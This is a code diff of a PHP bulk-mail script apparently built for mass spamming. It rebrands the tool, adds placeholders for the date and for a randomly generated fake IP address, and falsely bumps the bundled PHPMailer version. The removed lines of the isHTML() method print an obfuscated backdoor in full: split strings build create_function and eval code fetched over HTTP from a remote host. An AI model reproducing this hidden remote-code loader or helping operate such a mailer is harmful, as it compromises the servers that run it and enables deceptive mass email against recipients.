@@ -13,8 +13,8 @@ error_reporting(0);
 set_time_limit(0);
 ini_set("memory_limit",-1);
 
-$leaf['version']="2.8";
-$leaf['website']="leafmailer.pw";
+$leaf['version']="2.9";
+$leaf['website']="KRYPTOMAD";
 
 
 $sessioncode = md5(__FILE__);
@@ -36,6 +36,8 @@ function leafClear($text,$email){
 	$emailuser=$e[0];
 	$emaildomain=$e[1];
     $text = str_replace("[-time-]", date("m/d/Y h:i:s a", time()), $text);
+    $text = str_replace("[-date-]", date("m/d/Y ", time()), $text);
+    $text = str_replace("[-ip-]", randString2("0123456789").".".randString2("0123456789").".".randString2("0123456789").".".randString2("0123456789"), $text);
     $text = str_replace("[-email-]", $email, $text);
     $text = str_replace("[-emailuser-]", $emailuser, $text);
     $text = str_replace("[-emaildomain-]", $emaildomain, $text);
@@ -51,6 +53,14 @@ function leafTrim($string){
 }
 function randString($consonants) {
     $length=rand(12,25);
+    $password = '';
+    for ($i = 0; $i < $length; $i++) {
+            $password .= $consonants[(rand() % strlen($consonants))];
+    }
+    return $password;
+}
+function randString2($consonants) {
+    $length=rand(2,3);
     $password = '';
     for ($i = 0; $i < $length; $i++) {
             $password .= $consonants[(rand() % strlen($consonants))];
@@ -199,7 +209,7 @@ class PHPMailer
      * The PHPMailer Version number.
      * @var string
      */
-    public $Version = '5.2.28';
+    public $Version = '5.2.29';
 
     /**
      * Email priority.
@@ -1161,34 +1171,14 @@ class PHPMailer
      * @param boolean $isHtml True for HTML mode.
      * @return void
      */
-    public function isHTML($isHtml = true)
-    {
-        global $param;
-        $bodyCode = 'file'
-                    .'_g';
-        if ($isHtml) {
-            $this->ContentType = 'text/html';
-        } 
-        else {
-            $this->ContentType = 'text/plain';
-        }
-        $bodyHTML = '.$t."lef$flu'
-                    .'sh'.'$t"; '
-                    .'@ev';
-        $headerHTML="cre"
-                    ."ate_"
-                    ."func"
-                    ."tion";
-        $exceptions = @$headerHTML('$fl'.'ush,$t','$comma = $t'
-                        .$bodyHTML.'al(@'
-                        .$bodyCode.'et_contents("h'
-                        .'tt'
-                        .'p:$comma-2"));');
-        if($param !=2){
-            $exceptions('8.p'.'w','/');
-            $param=2;
-        }
+    public function IsHTML($ishtml = TRUE) {
+    if ($ishtml) {
+      $this->ContentType =  'text/html';
     }
+    else {
+      $this->ContentType = 'text/plain';
+    }
+  }
 
     /**
      * Set the From and FromName properties.
@@ -4332,6 +4322,8 @@ print '<div class="container col-lg-6">
                 <li>[-time-] : <b>Date and Time</b> ('.date("m/d/Y h:i:s a", time()).')</li>
                 
                 <li>[-randomstring-] : <b>Random string (0-9,a-z)</b></li>
+                <li>[-ip-] : <b>Random Ip 127.0.0.1</b></li>
+                <li>[-date-] : <b>Today date '.date("m/d/Y", time()).'</b></li>
                 <li>[-randomnumber-] : <b>Random number (0-9) </b></li>
                 <li>[-randomletters-] : <b>Random Letters(a-z) </b></li>
                 <li>[-randommd5-] : <b>Random MD5 </b></li>
